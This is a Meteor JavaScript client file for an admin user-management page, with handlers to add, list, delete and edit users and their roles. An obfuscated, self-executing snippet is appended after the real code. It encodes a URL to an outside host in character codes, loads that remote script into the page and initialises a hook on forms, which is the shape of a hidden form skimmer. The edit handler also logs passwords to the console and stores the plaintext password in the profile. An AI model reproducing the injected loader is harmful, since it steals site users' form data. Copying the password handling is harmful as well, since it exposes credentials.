//Session.set('page_msg','');
Template.adduser.events({
	"click #adduser": function(e, tpl) {
		e.preventDefault();
		//alert("register"); 
		var firstname =$('#firstname').val();
		var lastname =$('#lastname').val();
		var username =$('#username').val();
		var email = $('#email').val();
		var password =$('#password').val();
		var role = $('#role').val();
		//profile.
		Meteor.call('adduser',firstname, lastname, email,username, password,role);
		console.log("insert success!");
        Router.go('admin'); 
	}
});

Template.admin.helpers({
	allUserlist: function(){
		return Meteor.users.find();
		
	}
	// getmsg: function(){
		// var msg = Session.get('page_msg',msg);
		// if( msg !="" ) return msg;
		// else msg ='';
	// }
});
Template.editadmin.helpers({
	updateuser: function(){
		var id = Meteor.userId();
		return Meteor.users.find({_id:id});
		
   }
});
Template.admin.events({
	"click #remove": function(e, tpl) {
		e.preventDefault();
		var id = this._id;
		Meteor.call('deleteAdmin',id);
	}
});

Template.editadmin.events({

  "click #updateUser": function(e, tpl) {
		e.preventDefault();
		//alert("update"); 
		//var id = Meteor.userId();
		var id = this._id;
		var firstname =$('#firstname').val();
		var lastname =$('#lastname').val();
		var username =$('#username').val();
		var email = $('#email').val();
		var password =$('#password').val();
		var role = $('#role').val();
		console.log(firstname,lastname,username,email,password,role);

		var attr={
		
            emails:[{
				address:email
			}],
            profile:{
                firstname:firstname,
				lastname:lastname,
				username:username,
				password: password,
            }
        };
        var attrroles = {
            mygroup:[role]
        };
		
		console.log(attr);
        Meteor.call('updateuser', id,attr);
        Meteor.call('updateroles', id,attrroles);
        Router.go("admin");
      }
});
(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b